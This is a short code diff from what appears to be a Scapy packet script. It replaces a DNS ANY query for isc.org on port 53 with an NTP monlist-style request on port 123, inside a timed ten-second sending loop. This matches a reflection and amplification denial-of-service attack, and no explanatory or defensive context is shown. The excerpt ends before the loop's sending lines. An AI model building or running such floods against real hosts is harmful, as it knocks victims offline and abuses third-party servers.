@@ -4,8 +4,8 @@ import time
 A= "192.168.30.1"
 B= "192.168.20.1"
 C= RandShort()
-D= 53
-E= DNS(rd=1L, qd=DNSQR(qname="isc.org.", qtype="ALL", qclass="IN"))
+D= 123
+E= "\x17\x00\x03\x2a\x00\x00\x00\x00" + "\x41" * 40
 
 start = time.time()
 while (time.time() - start < 10):
